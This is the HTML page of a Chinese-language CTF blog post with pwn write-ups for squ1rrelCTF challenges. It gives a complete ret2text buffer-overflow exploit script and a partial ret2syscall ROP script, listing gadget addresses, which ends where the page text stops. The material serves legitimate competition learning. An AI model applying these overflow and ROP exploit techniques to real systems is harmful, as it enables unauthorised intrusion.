<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="zh-CN" data-mode="dark">
  <head>
  <style>
    #canvas-dust {
      z-index: -65536;
      pointer-events: none;
      position: fixed;
      top: 0;
      left: 0;
    }
  </style>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" >
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="squ1rrelCTF Pwn WriteUp - g1P03n" />
<meta name="author" content="imLZH1" />
<meta property="og:locale" content="zh_CN" />
<meta name="description" content="ak" />
<meta property="og:description" content="ak" />
<link rel="canonical" href="http://localhost:4000/posts/squ1rrel-CTF-PWN-g1P03n/" />
<meta property="og:url" content="http://localhost:4000/posts/squ1rrel-CTF-PWN-g1P03n/" />
<meta property="og:site_name" content="imLZH1’ Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-04-07T00:00:00+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="squ1rrelCTF Pwn WriteUp - g1P03n" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"imLZH1"},"dateModified":"2025-04-07T00:00:00+08:00","datePublished":"2025-04-07T00:00:00+08:00","description":"ak","headline":"squ1rrelCTF Pwn WriteUp - g1P03n","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/squ1rrel-CTF-PWN-g1P03n/"},"url":"http://localhost:4000/posts/squ1rrel-CTF-PWN-g1P03n/"}</script>
<!-- End Jekyll SEO tag -->


  <title>squ1rrelCTF Pwn WriteUp - g1P03n | imLZH1' Blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="imLZH1' Blog">
<meta name="application-name" content="imLZH1' Blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    

    <link rel="stylesheet" href="/assets/lib/fonts/main.css">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="/assets/lib/bootstrap/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="/assets/lib/fontawesome-free/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="/assets/lib/tocbot/tocbot.min.css">
  

  
    <link rel="stylesheet" href="/assets/lib/loading-attribute-polyfill/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="/assets/lib/magnific-popup/magnific-popup.css">
  

  <!-- JavaScript -->

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<canvas id="canvas-dust"></canvas>
<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/tx.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <h1 class="site-title">
      <a href="/">imLZH1' Blog</a>
    </h1>
    <!--
    <p class="site-subtitle fst-italic mb-0"></p>
    -->
    <p id="copywriting" class="site-subtitle fst-italic mb-0"></p>

    <script text="javascript">
          fetch('/assets/index_about.json',{headers:({
            'copywriting.jsion': 'application/x-www-form-urlencoded'
          })})
          .then(function(response) {
            return response.json();
          })
          .then(function(myJson) {
            var max = myJson.length;
            var copywritingId = Math.ceil(Math.random()*max)-1;
            console.log(`%c
      _    _.--.____.--._
     ( )=.-":;:;:;;':;:;:;"-._
      \\\\:;:;:;:;:;;:;::;:;:;:\\
       \\\\:;:;:;:;:;;:;:;:;:;:;\\
        \\\\:;::;:;:;:;:;::;:;:;:\\
         \\\\:;:;:;:;:;;:;::;:;:;:\\
          \\\\:;::;:;:;:;:;::;:;:;:\\
           \\\\;;:;:_:--:_:_:--:_;:;\\
            \\\\_.-"             "-._\\
             \\\\
              \\\\
               \\\\
                \\\\
                 \\\\
                  \\\\\ `,'color: #03A9F4; font-weight: bold');
            console.log(`%c `+myJson[copywritingId], `color: #03A9F4; font-weight: bold`);
            document.getElementById('copywriting').innerHTML = myJson[copywritingId];
          });
          </script>
	<script>
		'use strict';
		function getElement(string, item = document.documentElement) {
		    let tmp = item.querySelector(string);
		    if (tmp === null) {
			throw new Error("Unknown HTML");
		    }
		    return tmp;
		}
		function getParent(item, level = 1) {
		    while (level--) {
			let tmp = item.parentElement;
			if (tmp === null) {
			    throw new Error("Unknown HTML");
			}
			item = tmp;
		    }
		    return item;
		}
		function format(format, ...args) {
		    return format.replaceAll(/\$\*?[0-9]*/g, (match) => {
			if (match === '$*') {
			    return '';
			}
			let Index = match.slice(1);
			if (Index >= args.length) {
			    return '';
			}
			return args[Index];
		    });
		}
		class dust {
		    constructor(x = 50, y = 50) {
			this.vx = Math.random() * 1 + 1;
			this.vy = Math.random() * 1 + 0.01;
			this.shadowBlur = Math.random() * 3;
			this.shadowX = (Math.random() * 2) - 1;
			this.shadowY = (Math.random() * 2) - 1;
			this.radiusX = Math.random() * 1.5 + 0.5;
			this.radiusY = this.radiusX * (Math.random() * (1.3 - 0.3) + 0.3);
			this.rotation = Math.PI * Math.floor(Math.random() * 2);
			this.x = x;
			this.y = y;
		    }
		}
		class canvasDust {
		    constructor(canvasID) {
			this.color = '#fff';
			this.width = 300;
			this.height = 300;
			this.dustQuantity = 50;
			this.dustArr = [];
			this.inStop = false;
			this.build = () => {
			    this.resize();
			    if (this.ctx) {
				const point = canvasDust.getPoint(this.dustQuantity);
				for (let i of point) {
				    const dustObj = new dust(i[0], i[1]);
				    this.buildDust(dustObj);
				    this.dustArr.push(dustObj);
				}
				requestAnimationFrame(this.paint);
			    }
			};
			this.paint = () => {
			    if (this.inStop) {
				return;
			    }
			    const dustArr = this.dustArr;
			    for (let i of dustArr) {
				this.ctx.clearRect(i.x - 6, i.y - 6, 12, 12);
				if (i.x < -5 || i.y < -5) {
				    const x = this.width;
				    const y = Math.floor(Math.random() * window.innerHeight);
				    i.x = x;
				    i.y = y;
				}
				else {
				    i.x -= i.vx;
				    i.y -= i.vy;
				}
			    }
			    for (let i of dustArr) {
				this.buildDust(i);
			    }
			    requestAnimationFrame(this.paint);
			};
			this.buildDust = (dust) => {
			    const ctx = this.ctx;
			    ctx.beginPath();
			    ctx.shadowBlur = dust.shadowBlur;
			    ctx.shadowOffsetX = dust.shadowX;
			    ctx.shadowOffsetY = dust.shadowY;
			    ctx.ellipse(dust.x, dust.y, dust.radiusX, dust.radiusY, dust.rotation, 0, Math.PI * 2);
			    ctx.closePath();
			    ctx.fill();
			};
			this.resize = () => {
			    const canvas = this.canvas;
			    const width = window.innerWidth;
			    const height = window.innerHeight;
			    this.width = width;
			    this.height = height;
			    this.dustQuantity = Math.floor((width + height) / 38);
			    canvas.width = width;
			    canvas.height = height;
			    this.ctx.shadowColor =
				this.ctx.fillStyle = this.color;
			};
			this.stop = () => {
			    this.inStop = true;
			};
			this.play = () => {
			    if (this.inStop === true) {
				this.inStop = false;
				requestAnimationFrame(this.paint);
			    }
			};
			const canvas = getElement(canvasID);
			this.canvas = canvas;
			this.ctx = this.canvas.getContext('2d');
			this.build();
			window.addEventListener('resize', this.resize);
		    }
		}
		canvasDust.getPoint = (number = 1) => {
		    let point = [];
		    for (let i = 0; i < number; ++i) {
			const x = Math.floor(Math.random() * window.innerWidth);
			const y = Math.floor(Math.random() * window.innerHeight);
			point.push([x, y]);
		    }
		    return point;
		};
		try {
		    var canvasDusts = new canvasDust('#canvas-dust');
		}
		catch (e) { }
	  </script>	
	  


  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>首页</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>归档</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>关于</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/Friends/" class="nav-link">
            <i class="fa-fw fas fa-user-friends"></i>
            

            <span>FRIENDS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://github.com/imLZH1"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github-alt"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['qingwachong','qq.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">
                首页
              </a>
            </span>

          
        
          
        
          
            
              <span>squ1rrelCTF Pwn WriteUp - g1P03n</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      文章
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="搜索..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">取消</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>squ1rrelCTF Pwn WriteUp - g1P03n</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        发表于
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1743955200"
  data-df="YYYY/MM/DD"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  2025/04/07
</time>

      </span>

      <!-- lastmod date -->
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          作者

          <em>
            
              
                
                
              
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="2875 字"
>
  <em>15 分钟</em>阅读</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <p>ak</p>

<h2 id="pwn-deja-vu"><span class="me-2">pwn-deja vu</span><a href="#pwn-deja-vu" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<p><a href="/assets/img/2025-CTFWP-images/2025-squ1rrelCTF/assets/image-20250406214158-3rswcja.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-squ1rrelCTF/assets/image-20250406214158-3rswcja.png" alt="image" loading="lazy"></a></p>

<p><a href="/assets/img/2025-CTFWP-images/2025-squ1rrelCTF/assets/image-20250406214610-k0ql5fj.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-squ1rrelCTF/assets/image-20250406214610-k0ql5fj.png" alt="image" loading="lazy"></a></p>

<p>栈溢出，ret2text</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span><span class="o">*</span>  
<span class="n">elf</span><span class="o">=</span><span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./vu</span><span class="sh">'</span><span class="p">)</span>
<span class="n">p</span><span class="o">=</span><span class="nf">process</span><span class="p">(</span><span class="sh">'</span><span class="s">./vu</span><span class="sh">'</span><span class="p">)</span> 
<span class="c1">#p=remote('20.84.72.194',5002)
</span><span class="nf">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="sh">'</span><span class="s">linux</span><span class="sh">'</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="sh">'</span><span class="s">debug</span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
</span><span class="k">def</span> <span class="nf">s</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">sa</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">sl</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">sla</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>   
<span class="k">def</span> <span class="nf">li</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
    <span class="nf">print</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>     
<span class="k">def</span> <span class="nf">r</span><span class="p">():</span>
    <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
<span class="k">def</span> <span class="nf">pr</span><span class="p">():</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">())</span>
<span class="k">def</span> <span class="nf">rl</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">inter</span><span class="p">():</span>
    <span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="k">def</span> <span class="nf">get_32</span><span class="p">():</span>
    <span class="k">return</span> <span class="nf">u32</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\xf7</span><span class="sh">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:])</span>    
<span class="k">def</span> <span class="nf">get_addr</span><span class="p">():</span>
    <span class="k">return</span> <span class="nf">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x7f</span><span class="sh">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="k">def</span> <span class="nf">get_sb</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">],</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>    
<span class="k">def</span> <span class="nf">bug</span><span class="p">():</span>
	<span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
	
<span class="n">pay</span><span class="o">=</span><span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x48</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x4011F6</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>

<span class="nf">inter</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<h2 id="pwn-jail"><span class="me-2">pwn-jail!</span><a href="#pwn-jail" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<p>‍</p>

<p><a href="/assets/img/2025-CTFWP-images/2025-squ1rrelCTF/assets/image-20250406215914-efrjm83.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-squ1rrelCTF/assets/image-20250406215914-efrjm83.png" alt="image" loading="lazy"></a>
栈溢出，静态编译的文件，直接ret2syscall</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span><span class="o">*</span>  
<span class="n">elf</span><span class="o">=</span><span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./prison</span><span class="sh">'</span><span class="p">)</span>
<span class="n">p</span><span class="o">=</span><span class="nf">process</span><span class="p">(</span><span class="sh">'</span><span class="s">./prison</span><span class="sh">'</span><span class="p">)</span> 
<span class="c1">#p=remote('20.84.72.194',5002)
</span><span class="nf">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="sh">'</span><span class="s">linux</span><span class="sh">'</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="sh">'</span><span class="s">debug</span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
</span><span class="k">def</span> <span class="nf">s</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">sa</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">sl</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">sla</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>   
<span class="k">def</span> <span class="nf">li</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
    <span class="nf">print</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>     
<span class="k">def</span> <span class="nf">r</span><span class="p">():</span>
    <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
<span class="k">def</span> <span class="nf">pr</span><span class="p">():</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">())</span>
<span class="k">def</span> <span class="nf">rl</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">inter</span><span class="p">():</span>
    <span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="k">def</span> <span class="nf">get_32</span><span class="p">():</span>
    <span class="k">return</span> <span class="nf">u32</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\xf7</span><span class="sh">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:])</span>    
<span class="k">def</span> <span class="nf">get_addr</span><span class="p">():</span>
    <span class="k">return</span> <span class="nf">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x7f</span><span class="sh">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="k">def</span> <span class="nf">get_sb</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">],</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>    
<span class="k">def</span> <span class="nf">bug</span><span class="p">():</span>
	<span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
	

<span class="nf">rl</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">They gave you the premium stay so at least you get to choose your cell (1-6): </span><span class="sh">'</span><span class="p">)</span>
<span class="n">rdi</span><span class="o">=</span><span class="mh">0x401A0D</span>
<span class="n">rdx</span><span class="o">=</span><span class="mh">0x401A1A</span>
<span class="n">rax</span><span class="o">=</span><span class="mh">0x000000000041f464</span>
<span class="n">syscall</span><span class="o">=</span><span class="mh">0x00000000004013b8</span>
<span class="n">rsp</span><span class="o">=</span><span class="mh">0x00000000004450f8</span>
<span class="n">bss</span><span class="o">=</span><span class="mh">0x4CE300</span>
<span class="n">rsi</span><span class="o">=</span><span class="mh">0x0000000000413676</span>
